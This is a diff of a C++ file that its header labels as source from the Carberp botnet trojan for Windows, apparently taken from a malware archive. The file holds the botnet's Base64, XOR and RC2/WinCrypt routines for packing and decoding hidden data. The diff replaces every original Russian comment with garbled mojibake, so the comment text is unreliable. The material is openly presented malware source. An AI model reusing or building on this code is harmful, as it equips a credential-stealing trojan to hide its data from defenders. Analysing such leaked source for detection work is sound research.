@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wincrypt.h>
 
@@ -100,9 +111,9 @@ PCHAR BASE64::Encode(LPBYTE Buf, DWORD BufSize)
 
 PCHAR BASE64::Decode(PCHAR Buf, DWORD *ResultSize)
 {
-	// Раcшифровать данные из формата BASE64
-	// Размер итогового буфера можно узнать функцией STR::Length,
-	// Либо передать указатель на переменную, куда его записатиь
+	// пїЅпїЅcпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ BASE64
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ STR::Length,
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (ResultSize != NULL)
 		*ResultSize = 0;
 	if (STR::IsEmpty(Buf))
@@ -188,7 +199,7 @@ DWORD XORCrypt::Crypt(PCHAR Password, LPBYTE Buffer, DWORD Size)
 	return a;
 }
 
-// Для соответствия TCryptMethod
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ TCryptMethod
 bool XORCrypt::Crypt(LPVOID Password, LPBYTE Buffer, DWORD Size, PDWORD OutSize)
 {
 	if (Buffer == NULL || Size == 0)
@@ -201,7 +212,7 @@ bool XORCrypt::Crypt(LPVOID Password, LPBYTE Buffer, DWORD Size, PDWORD OutSize)
 
 LPBYTE XORCrypt::DecodeBuffer(PCHAR  Signature, LPVOID Buffer, DWORD &Size)
 {
-	// Функция расшифровывает буфер содержащий пароль
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (Buffer == NULL || Size == 0)
 		return NULL;
@@ -209,7 +220,7 @@ LPBYTE XORCrypt::DecodeBuffer(PCHAR  Signature, LPVOID Buffer, DWORD &Size)
 	PCHAR Buf = (PCHAR)Buffer;
 	PCHAR Start = Buf;
 
-	// Сравниваем сигнатуру
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!STR::IsEmpty(Signature))
 	{
 		DWORD SignLen = StrCalcLength(Signature);
@@ -228,12 +239,12 @@ LPBYTE XORCrypt::DecodeBuffer(PCHAR  Signature, LPVOID Buffer, DWORD &Size)
 	Buf += PassSize;
 
 
-	// Определяем новый размер буфера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	int NewSize = Buf - Start;
 	if ((DWORD)NewSize > Size)
 		return NULL;
 	Size -= NewSize;
-	// Расшифровываем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	NewSize = XORCrypt::Crypt(Password, (LPBYTE)Buf, Size);
 	STR::Free(Password);
 	if (NewSize <= 0)
@@ -246,15 +257,15 @@ LPBYTE XORCrypt::DecodeBuffer(PCHAR  Signature, LPVOID Buffer, DWORD &Size)
 
 
 //****************************************************************************
-//  Методы для шифрования методами WIN Crypt
-//  буфер собран по следующему алгоритму (Б - байт)
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ WIN Crypt
+//  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅ - пїЅпїЅпїЅпїЅ)
 //
-//  (4Б перваля половина IV)(BASE64 данные)(4Б вторая половина IV)(окончание BASE64 ==)
+//  (4пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IV)(BASE64 пїЅпїЅпїЅпїЅпїЅпїЅ)(4пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IV)(пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ BASE64 ==)
 //****************************************************************************
 
 PCHAR RC2Crypt::ExtractIV(PCHAR Buf, DWORD StrLen)
 {
-	// Функция извлекает вектор инициализации ключа из буфера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(Buf))
 		return NULL;
 
@@ -264,12 +275,12 @@ PCHAR RC2Crypt::ExtractIV(PCHAR Buf, DWORD StrLen)
 
 	PCHAR V = STR::Alloc(8);
 
-	// Получаем первуб часть вектора
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	STR::Copy(Buf, V, 0, 4);
 	STR::Delete(Buf, 0, 4);
 	StrLen -= 4;
 
-	// Получаем вторую часть
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PCHAR Ptr = Buf + StrLen - 1;
 	while (Ptr > Buf && *Ptr == '=') Ptr--;
     Ptr -= 3;
@@ -279,7 +290,7 @@ PCHAR RC2Crypt::ExtractIV(PCHAR Buf, DWORD StrLen)
 	return V;
 }
 
-// Генерировать случайный вектор
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 PCHAR RC2Crypt::GenerateIV()
 {
 	PCHAR V = STR::Alloc(8);
@@ -297,27 +308,27 @@ PCHAR RC2Crypt::GenerateIV()
 
 PCHAR RC2Crypt_PackEncodedBuffer(PCHAR Buf, DWORD BufSize, PCHAR IV)
 {
-	// Запаковываем в буфер зашифрованные данные и вектор ключа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PCHAR Result = STR::Alloc(BufSize + 8);
 	if (Result == NULL)
 		return NULL;
 
     PCHAR P = Result;
-	// Вставляем первые 4 байта ключа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 4 пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	STR::Copy(IV, P, 0, 4);
     P += 4;
-	// Определяем границу до которой нужно копировать тело Base64
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ Base64
 	PCHAR End = Buf + BufSize;
 	while (End > Buf && *(End - 1) == '=') End--;
 
 	STR::Copy(Buf, P, 0, End - Buf);
 	P += End - Buf;
 
-	// Копируем вторую часть вектора
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	STR::Copy(IV, P, 4, 4);
 	P += 4;
 
-	// копируем оставшуюся часть буфера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	STR::Copy(End, P, 0, BufSize - (End - Buf));
 
     return Result;
@@ -325,7 +336,7 @@ PCHAR RC2Crypt_PackEncodedBuffer(PCHAR Buf, DWORD BufSize, PCHAR IV)
 
 PCHAR RC2Crypt::Encode(LPBYTE Buf, DWORD BufSize,  PCHAR Password)
 {
-	// кодировать буфер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Buf == NULL || BufSize == 0 || STR::IsEmpty(Password))
 		return NULL;
 
@@ -342,9 +353,9 @@ PCHAR RC2Crypt::Encode(LPBYTE Buf, DWORD BufSize,  PCHAR Password)
 
 	if (NewBuf != NULL)
 	{
-		// Кодируем в BASE64
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ BASE64
 		PCHAR B64 = BASE64::Encode(NewBuf, EncBufSize);
-		// Запаковываем буфер с вектором
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
         Result = RC2Crypt_PackEncodedBuffer(B64, STR::Length(B64), IV);
 
         STR::Free(B64);
@@ -359,13 +370,13 @@ PCHAR RC2Crypt::Encode(LPBYTE Buf, DWORD BufSize,  PCHAR Password)
 
 bool RC2Crypt::Decode(PCHAR Password, PCHAR Buf, DWORD &BufSize)
 {
-	// Декодировать буфер
-	// на входе строка BASE64 символов с вшитым в них ыектором IV
-	// BufSize - Размер передаваемого буфера.
-	// Если содержит нулевое значение, то размер буфера
-	// будет просчитан до нулевого символа.
-	// После отработки метода BufSize будет указывать на размер
-	// расшифрованного буфера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ BASE64 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IV
+	// BufSize - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ BufSize пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (STR::IsEmpty(Buf))
 		return false;
@@ -377,9 +388,9 @@ bool RC2Crypt::Decode(PCHAR Password, PCHAR Buf, DWORD &BufSize)
 
 	PCHAR V = ExtractIV(Buf, BufSize);
 	if (V == NULL) 	return false;
-	BufSize -= 8; // Уменьшаем на размер вектора
+	BufSize -= 8; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-	// BASE64 расшифровка
+	// BASE64 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR B64 = BASE64::Decode(Buf);
 
 	BufSize = STR::Length(B64);
@@ -388,7 +399,7 @@ bool RC2Crypt::Decode(PCHAR Password, PCHAR Buf, DWORD &BufSize)
 		*(Buf + BufSize) = 0;
 	STR::Free(B64);
 
-	// Расшифровываем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	WinDecode(Buf, BufSize, Password, V);
 	STR::Free(V);
 
@@ -398,7 +409,7 @@ bool RC2Crypt::Decode(PCHAR Password, PCHAR Buf, DWORD &BufSize)
 
 bool RC2Crypt::DecodeStr(PCHAR Password, PCHAR Str)
 {
-	// Функция декодирует строку и обновляет её размер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(Str) || STR::IsEmpty(Password))
 		return false;
 	DWORD Size = STR::Length(Str);
@@ -414,8 +425,8 @@ bool RC2Crypt::DecodeStr(PCHAR Password, PCHAR Str)
 
 LPBYTE RC2Crypt::WinEncode(LPBYTE Buf, DWORD &BufSize, PCHAR Password, PCHAR IV)
 {
-	// Шифровать буфер используя Win Crypto API
-	// Функция выделяет необходимый объём памяти методом MemAlloc()
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Win Crypto API
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ MemAlloc()
 	if (Buf == NULL || BufSize == 0 || STR::IsEmpty(Password) || STR::IsEmpty(IV))
 		return NULL;
 
@@ -424,7 +435,7 @@ LPBYTE RC2Crypt::WinEncode(LPBYTE Buf, DWORD &BufSize, PCHAR Password, PCHAR IV)
 	LPBYTE NewBuf = NULL;
 	if (GenerateKey(Password, IV, Provider, Key))
 	{
-		// Лпределяем нужный размер буфера
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD NewBufSize = BufSize;
 		if (pCryptEncrypt(Key, 0, true, 0, NULL, &NewBufSize, 0))
 		{
@@ -447,7 +458,7 @@ LPBYTE RC2Crypt::WinEncode(LPBYTE Buf, DWORD &BufSize, PCHAR Password, PCHAR IV)
 
 PCHAR RC2Crypt::WinDecode(PCHAR Buf, DWORD &BufSize, PCHAR Password, PCHAR IV)
 {
-	// Декодировать буфер используя Win Crypto API
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Win Crypto API
 	HCRYPTPROV Provider;
 	HCRYPTKEY Key;
 	if (GenerateKey(Password, IV, Provider, Key))
@@ -471,7 +482,7 @@ typedef struct TKeyBlob
 
 bool RC2Crypt::GenerateKey(PCHAR Password, PCHAR IV, HCRYPTPROV &Provider, HCRYPTKEY &Key)
 {
-	// Генерировать ключ криптования на основе пароля и вектора инициализации IV
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IV
 
 	Provider = NULL;
 	Key = NULL;
@@ -484,11 +495,11 @@ bool RC2Crypt::GenerateKey(PCHAR Password, PCHAR IV, HCRYPTPROV &Provider, HCRYP
 	DWORD CryptMode;
 	DWORD PadMode;
 
-	// Поключаемся к провайдеру
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!pCryptAcquireContextA(&Provider, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
 		return false;
 
-    // импортируем ключ
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	ClearStruct(KeyBlob);
 	KeyBlob.KeyHeader.bType    = PLAINTEXTKEYBLOB;
 	KeyBlob.KeyHeader.bVersion = CUR_BLOB_VERSION;
@@ -505,7 +516,7 @@ bool RC2Crypt::GenerateKey(PCHAR Password, PCHAR IV, HCRYPTPROV &Provider, HCRYP
         return false;
     }
 
-	// Настраиваем ключ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	bool ValidKey = true;
 	if (!pCryptSetKeyParam(Key, KP_IV, (LPBYTE)IV, 0))
 		ValidKey = false;
